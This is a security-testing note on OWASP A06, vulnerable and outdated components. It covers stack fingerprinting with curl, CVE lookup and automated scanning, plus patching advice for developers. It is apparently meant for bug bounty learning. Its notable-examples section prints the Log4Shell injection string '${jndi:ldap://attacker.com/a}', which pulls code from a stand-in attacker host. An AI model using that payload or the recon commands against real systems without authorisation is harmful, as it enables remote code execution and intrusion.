# A06 — Vulnerable and Outdated Components

← [[OWASP-Overview]]

---

Modern applications are mostly third-party code. A typical Node.js app has hundreds of npm dependencies. A Java app pulls in dozens of JAR files. If any component has a known vulnerability and hasn't been updated, the entire application is at risk.

---

## Why It's Commonly Exploited

- Developers update their own code but forget about dependencies
- A transitive dependency (a dependency of a dependency) is vulnerable
- The org doesn't have visibility into what versions are running
- Updating a library might break the app — so updates get deferred
- CVEs are public — attackers know exactly what to look for

---

## What This Covers

- Outdated web frameworks (old Rails, Django, Spring, Laravel versions)
- Vulnerable JavaScript libraries (jQuery, Angular, Bootstrap with known CVEs)
- Outdated CMS (WordPress plugins, Drupal modules)
- Server software with known exploits (Apache, nginx, IIS, Tomcat)
- Outdated OS packages on the server
- Third-party services and SDKs with vulnerabilities

---

## Fingerprinting the Stack

Before you can check for outdated components, you need to identify them. See [[Fingerprinting]] for the full methodology.

Quick wins:
```bash
# Headers often leak versions
curl -sI https://example.com | grep -iE "(server|x-powered-by|x-aspnet)"

# JavaScript library versions in source
curl -s https://example.com | grep -iE "jquery|angular|react|bootstrap" | head -20

# WordPress version
curl -s https://example.com/readme.html | grep -i version
curl -s https://example.com | grep -oP 'ver=\d+\.\d+[\.\d]*'

# npm lock file or package.json exposed
curl https://example.com/package.json
curl https://example.com/package-lock.json
```

---

## CVE Research

Once you have version numbers, look for known vulnerabilities.

```bash
# searchsploit — local exploit database
searchsploit apache 2.4.49
searchsploit "wordpress 5.7"
searchsploit "jquery 1.12"

# Online resources
https://nvd.nist.gov/vuln/search           # NIST NVD
https://cve.mitre.org/                      # CVE database
https://www.exploit-db.com/                 # Exploit-DB
https://snyk.io/vuln/                       # Snyk vuln database
```

---

## Notable Examples

### Apache Log4Shell (CVE-2021-44228)
One of the worst RCE vulns in history. Java applications using Log4j 2.x were vulnerable to RCE via a specially crafted string in any logged input field:

```
${jndi:ldap://attacker.com/a}
```

Any field that gets logged (username, User-Agent, search query) could trigger it. Affected millions of systems.

### Spring4Shell (CVE-2022-22965)
Spring Framework RCE via data binding.

### Apache Struts (CVE-2017-5638)
RCE via Content-Type header — used in the Equifax breach.

### jQuery XSS (CVE-2019-11358)
Prototype pollution in jQuery < 3.4.0 enabling XSS.

### WordPress Plugin Vulns
Thousands of WordPress plugins have CVEs. WPScan database tracks them all.

---

## Automated Scanning

```bash
# nuclei — templates for known CVEs
nuclei -l live_hosts.txt -t ~/nuclei-templates/cves/ -o cve_results.txt

# retire.js — JavaScript library vulnerabilities
retire --path ./js_files/

# WPScan for WordPress
wpscan --url https://example.com --enumerate p --plugins-detection aggressive

# npm audit for Node.js dependency check
npm audit

# OWASP Dependency-Check for Java/other languages
dependency-check --project "test" --scan ./lib/
```

---

## What to Look For on a Target

1. **Identify version numbers** from headers, source, error pages, README files, `package.json`
2. **Search for CVEs** on the identified versions
3. **Check if the CVE is exploitable** in this context — some require specific config
4. **Try the exploit** in a controlled way (don't cause damage)

> [!NOTE]
> On bug bounty programs, CVE exploitation is typically in scope if the vulnerable component is confirmed to be running and exploitable. Include the CVE number, evidence of the vulnerable version, and PoC in your report.

---

## For Developers

- Use `npm audit`, `pip-audit`, `bundler-audit`, `mvn dependency-check:check` in CI/CD
- Set up alerts with GitHub Dependabot or Snyk
- Keep a software bill of materials (SBOM)
- Have a patch management policy — don't defer security updates

---

*Related: [[Fingerprinting]] | [[A05-Security-Misconfiguration]] | [[OWASP-Overview]]*

*Sources: OWASP Top 10 2021, NVD, Snyk*
